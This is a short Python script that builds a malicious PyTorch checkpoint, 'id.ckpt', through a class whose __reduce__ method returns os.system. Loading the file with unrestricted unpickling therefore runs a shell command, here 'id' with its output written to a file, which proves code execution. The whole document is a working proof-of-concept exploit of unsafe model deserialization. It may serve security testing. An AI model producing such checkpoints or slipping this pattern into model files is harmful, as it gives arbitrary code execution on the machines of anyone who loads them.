import os
import torch

class Exploit:
    def __reduce__(self):
        cmd = ("id > output_dir/output.txt")
        return os.system, (cmd,)

model = Exploit()

torch.save(model, "id.ckpt")